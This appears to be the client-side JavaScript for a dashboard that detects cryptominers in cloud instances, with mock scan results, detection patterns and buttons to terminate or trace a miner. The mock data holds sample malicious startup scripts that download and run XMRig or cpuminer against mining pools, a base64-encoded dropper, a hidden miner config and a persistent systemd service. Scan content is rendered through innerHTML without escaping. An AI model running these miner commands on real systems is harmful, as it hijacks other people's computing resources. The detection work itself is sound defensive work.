document.addEventListener("DOMContentLoaded", () => {
  // Connect to Socket.io
  const socket = io()

  // Get DOM elements
  const highCount = document.getElementById("high-count")
  const mediumCount = document.getElementById("medium-count")
  const lowCount = document.getElementById("low-count")
  const totalCount = document.getElementById("total-count")
  const resultsBody = document.getElementById("results-body")

  // Modal elements
  const resultDetailModal = new bootstrap.Modal(document.getElementById("result-detail-modal"))
  const resultDetailContent = document.getElementById("result-detail-content")
  const terminateBtn = document.getElementById("terminate-btn")
  const traceBtn = document.getElementById("trace-btn")

  const traceDetailModal = new bootstrap.Modal(document.getElementById("trace-detail-modal"))
  const traceDetailContent = document.getElementById("trace-detail-content")

  // Current selected result
  let currentResult = null
  let currentTraceId = null

  // Load results from localStorage or fetch from API
  loadResults()

  // Socket.io event handlers
  socket.on("scan:completed", (data) => {
    console.log("New scan completed:", data)
    loadResults()
  })

  socket.on("miner:terminated", (data) => {
    console.log("Miner terminated:", data)
    alert(`Miner terminated: ${data.source}`)
    loadResults()
  })

  socket.on("trace:initiated", (data) => {
    console.log("Trace initiated:", data)
    currentTraceId = data.traceId
    showTraceDetails(data.traceId)
  })

  // Load results
  function loadResults() {
    // In a real app, you would fetch this from the server
    // For now, we'll use localStorage or generate mock data
    let results = JSON.parse(localStorage.getItem("scanResults"))

    if (!results || results.length === 0) {
      // Generate mock data if no results exist
      results = generateMockResults()
      localStorage.setItem("scanResults", JSON.stringify(results))
    }

    // Update counts
    const high = results.filter((r) => r.severity === "HIGH").length
    const medium = results.filter((r) => r.severity === "MEDIUM").length
    const low = results.filter((r) => r.severity === "LOW").length

    highCount.textContent = high
    mediumCount.textContent = medium
    lowCount.textContent = low
    totalCount.textContent = results.length

    // Populate table
    populateResultsTable(results)
  }

  // Populate results table
  function populateResultsTable(results) {
    if (results.length === 0) {
      resultsBody.innerHTML = `<tr><td colspan="6" class="text-center">No results found.</td></tr>`
      return
    }

    resultsBody.innerHTML = ""

    results.forEach((result, index) => {
      const row = document.createElement("tr")

      // Severity badge
      const severityClass =
        {
          HIGH: "danger",
          MEDIUM: "warning",
          LOW: "info",
          CLEAN: "success",
        }[result.severity] || "secondary"

      row.innerHTML = `
        <td><span class="badge bg-${severityClass}">${result.severity}</span></td>
        <td>${result.source}</td>
        <td>${result.itemType}</td>
        <td>${result.score}</td>
        <td>${result.contentPreview.substring(0, 50)}...</td>
        <td>
          <button class="btn btn-sm btn-primary view-btn" data-index="${index}">View</button>
        </td>
      `

      resultsBody.appendChild(row)
    })

    // Add event listeners to view buttons
    document.querySelectorAll(".view-btn").forEach((btn) => {
      btn.addEventListener("click", function () {
        const index = this.getAttribute("data-index")
        showResultDetails(results[index])
      })
    })
  }

  // Show result details in modal
  function showResultDetails(result) {
    currentResult = result

    // Format matches
    const matchesHtml = result.matches
      .map(
        (match) => `
      <div class="card mb-2">
        <div class="card-body">
          <h6 class="card-subtitle mb-2 text-muted">Category: ${match.category} (Weight: ${match.weight})</h6>
          <p class="card-text"><strong>Pattern:</strong> ${match.pattern}</p>
          <p class="card-text"><strong>Match:</strong> ${match.match}</p>
        </div>
      </div>
    `,
      )
      .join("")

    // Populate modal content
    resultDetailContent.innerHTML = `
      <div class="alert alert-${result.severity === "HIGH" ? "danger" : result.severity === "MEDIUM" ? "warning" : "info"}">
        Severity: ${result.severity} (Score: ${result.score})
      </div>
      
      <h5>Source</h5>
      <p>${result.source}</p>
      
      <h5>Type</h5>
      <p>${result.itemType}</p>
      
      <h5>Content Preview</h5>
      <pre class="bg-light p-3">${result.contentPreview}</pre>
      
      <h5>Matches</h5>
      ${matchesHtml}
    `

    // Show modal
    resultDetailModal.show()
  }

  // Show trace details in modal
  function showTraceDetails(traceId) {
    // In a real app, you would fetch this from the server
    // For now, we'll generate mock data

    fetch(`/api/trace/${traceId}`)
      .then((response) => response.json())
      .then((data) => {
        if (data.success) {
          const trace = data.trace

          // Format artifacts
          const artifactsHtml = trace.artifacts
            .map(
              (artifact) => `
            <tr>
              <td>${artifact.type}</td>
              <td>${artifact.name}</td>
              <td>${artifact.size}</td>
            </tr>
          `,
            )
            .join("")

          // Format findings
          const findingsHtml = trace.findings
            .map(
              (finding) => `
            <div class="alert alert-warning">
              <h6>${finding.type}</h6>
              <p>${Object.entries(finding)
                .filter(([key]) => key !== "type")
                .map(([key, value]) => `<strong>${key}:</strong> ${value}`)
                .join("<br>")}</p>
            </div>
          `,
            )
            .join("")

          // Populate modal content
          traceDetailContent.innerHTML = `
            <div class="alert alert-info">
              <h5>Trace ID: ${trace.traceId}</h5>
              <p>Status: ${trace.status} (${trace.progress}% complete)</p>
              <div class="progress">
                <div class="progress-bar" role="progressbar" style="width: ${trace.progress}%;" aria-valuenow="${trace.progress}" aria-valuemin="0" aria-valuemax="100">${trace.progress}%</div>
              </div>
            </div>
            
            <h5>Artifacts</h5>
            <table class="table table-striped">
              <thead>
                <tr>
                  <th>Type</th>
                  <th>Name</th>
                  <th>Size</th>
                </tr>
              </thead>
              <tbody>
                ${artifactsHtml}
              </tbody>
            </table>
            
            <h5>Findings</h5>
            ${findingsHtml}
          `

          // Show modal
          traceDetailModal.show()
        } else {
          alert(`Error fetching trace: ${data.error}`)
        }
      })
      .catch((error) => {
        console.error("Error:", error)
        alert(`Error fetching trace: ${error.message}`)
      })
  }

  // Generate mock results for testing
  function generateMockResults() {
    return [
      {
        timestamp: new Date().toISOString(),
        source: "AWS EC2 Instance: i-1234567890abcdef0",
        itemType: "EC2 UserData",
        contentPreview:
          "#!/bin/bash\ncurl -s -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz | tar -xz\ncd xmrig-6.16.4\n./xmrig -o pool.supportxmr.com:3333 -u 47Pih...",
        matches: [
          {
            pattern: "/\\bxmrig\\b/i",
            match: "xmrig",
            category: "miner_software",
            weight: 8,
          },
          {
            pattern: "/pool\\.supportxmr\\.com/i",
            match: "pool.supportxmr.com",
            category: "mining_pools",
            weight: 9,
          },
        ],
        score: 17,
        severity: "HIGH",
      },
      {
        timestamp: new Date().toISOString(),
        source: "GCP Compute Engine: instance-1",
        itemType: "Compute Engine Startup Script",
        contentPreview:
          '#!/bin/bash\napt-get update\napt-get install -y gcc make curl\nwget https://github.com/pooler/cpuminer/releases/download/v2.5.0/pooler-cpuminer-2.5.0.tar.gz\ntar -xzf pooler-cpuminer-2.5.0.tar.gz\ncd cpuminer-2.5.0\n./configure CFLAGS="-O3"\nmake\n./minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u email@example.com -p x',
        matches: [
          {
            pattern: "/\\bcpuminer\\b/i",
            match: "cpuminer",
            category: "miner_software",
            weight: 8,
          },
          {
            pattern: "/stratum\\+tcp:\\/\\//i",
            match: "stratum+tcp://",
            category: "mining_pools",
            weight: 9,
          },
        ],
        score: 17,
        severity: "HIGH",
      },
      {
        timestamp: new Date().toISOString(),
        source: "Azure VM: vm-cryptominer",
        itemType: "VM Custom Data",
        contentPreview:
          "IyEvYmluL2Jhc2gKY2QgL3RtcAp3Z2V0IGh0dHBzOi8vZ2l0aHViLmNvbS94bXJpZy94bXJpZy9yZWxlYXNlcy9kb3dubG9hZC92Ni4xNi40L3htcmlnLTYuMTYuNC1saW51eC1zdGF0aWMteDY0LnRhci5negp0YXIgLXh6ZiB4bXJpZy02LjE2LjQtbGludXgtc3RhdGljLXg2NC50YXIuZ3oKY2QgeG1yaWctNi4xNi40Ci4veG1yaWcgLW8gcG9vbC5zdXBwb3J0eG1yLmNvbTozMzMzIC11IDQ3UGloLi4u",
        matches: [
          {
            pattern: "base64_encoded_content",
            match: "IyEvYmluL2Jhc2gKY2QgL3R...",
            category: "obfuscation_techniques",
            weight: 4,
          },
          {
            pattern: "/\\bxmrig\\b/i",
            match: "xmrig",
            category: "miner_software",
            weight: 8,
          },
        ],
        score: 12,
        severity: "MEDIUM",
      },
      {
        timestamp: new Date().toISOString(),
        source: "File: /tmp/.hidden/config.json",
        itemType: "File",
        contentPreview:
          '{\n  "url": "pool.minexmr.com:4444",\n  "user": "47Pih...",\n  "pass": "x",\n  "algo": "cryptonight",\n  "threads": 4,\n  "cpu-priority": 5,\n  "cpu-affinity": null,\n  "donate-level": 1,\n  "background": true\n}',
        matches: [
          {
            pattern: "/pool\\.minexmr\\.com/i",
            match: "pool.minexmr.com",
            category: "mining_pools",
            weight: 9,
          },
          {
            pattern: "/--algo=/i",
            match: "algo",
            category: "miner_parameters",
            weight: 6,
          },
        ],
        score: 15,
        severity: "HIGH",
      },
      {
        timestamp: new Date().toISOString(),
        source: "Systemd Service: crypto-miner.service",
        itemType: "Service",
        contentPreview:
          "[Unit]\nDescription=Crypto Mining Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/miner --url=stratum+tcp://pool.supportxmr.com:3333 --user=47Pih... --pass=x\nRestart=always\n\n[Install]\nWantedBy=multi-user.target",
        matches: [
          {
            pattern: "/stratum\\+tcp:\\/\\//i",
            match: "stratum+tcp://",
            category: "mining_pools",
            weight: 9,
          },
          {
            pattern: "/pool\\.supportxmr\\.com/i",
            match: "pool.supportxmr.com",
            category: "mining_pools",
            weight: 9,
          },
        ],
        score: 18,
        severity: "HIGH",
      },
    ]
  }

  // Handle terminate button click
  terminateBtn.addEventListener("click", () => {
    if (!currentResult) return

    if (confirm(`Are you sure you want to terminate the miner in ${currentResult.source}?`)) {
      // Extract resource ID from source
      const resourceId = currentResult.source.split(": ")[1] || currentResult.source

      // Call API to terminate miner
      fetch("/api/terminate", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          source: currentResult.source,
          itemType: currentResult.itemType,
          resourceId: resourceId,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.success) {
            alert(`Termination initiated: ${data.result.message}`)
            resultDetailModal.hide()
          } else {
            alert(`Error: ${data.error}`)
          }
        })
        .catch((error) => {
          console.error("Error:", error)
          alert(`Error: ${error.message}`)
        })
    }
  })

  // Handle trace button click
  traceBtn.addEventListener("click", () => {
    if (!currentResult) return

    if (confirm(`Are you sure you want to initiate a trace for ${currentResult.source}?`)) {
      // Extract resource ID from source
      const resourceId = currentResult.source.split(": ")[1] || currentResult.source

      // Call API to initiate trace
      fetch("/api/trace", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          source: currentResult.source,
          itemType: currentResult.itemType,
          resourceId: resourceId,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.success) {
            currentTraceId = data.traceId
            resultDetailModal.hide()
            // The trace modal will be shown by the socket.io event handler
          } else {
            alert(`Error: ${data.error}`)
          }
        })
        .catch((error) => {
          console.error("Error:", error)
          alert(`Error: ${error.message}`)
        })
    }
  })
})

